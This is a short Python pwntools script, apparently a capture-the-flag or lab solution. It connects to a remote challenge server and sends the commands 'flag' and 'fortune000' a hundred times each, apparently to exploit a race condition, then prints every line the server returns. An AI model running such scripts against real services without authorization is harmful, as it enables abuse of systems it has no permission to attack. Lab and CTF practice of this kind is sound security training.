from pwn import *

def main():
    # 连接到服务器
    host = 'up.zoolab.org'
    port = 10931
    s = remote(host, port)
    
    for i in range(100):
        s.sendline("flag")
        s.sendline("fortune000")

    while True:
        print(s.recvline().decode().strip(), end='\n')

    s.close()

if __name__ == "__main__":
    main()
